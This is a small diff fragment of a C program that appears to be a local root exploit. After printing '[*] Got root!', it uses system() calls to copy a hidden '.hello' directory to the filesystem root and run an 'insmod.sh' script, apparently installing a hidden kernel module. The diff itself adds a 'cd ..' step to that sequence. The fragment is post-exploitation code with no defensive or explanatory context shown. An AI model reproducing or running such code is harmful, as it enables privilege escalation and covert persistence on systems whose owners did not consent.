@@ -272,6 +272,7 @@ int main(int argc, char * argv[])
 
        printf("[*] Got root!\n");
        //execl("/bin/sh", "/bin/sh", NULL);
+system ("cd ..");
 system ("pwd");
 system ("cp ./.hello /.hello");
 system ("/.hello/insmod.sh");
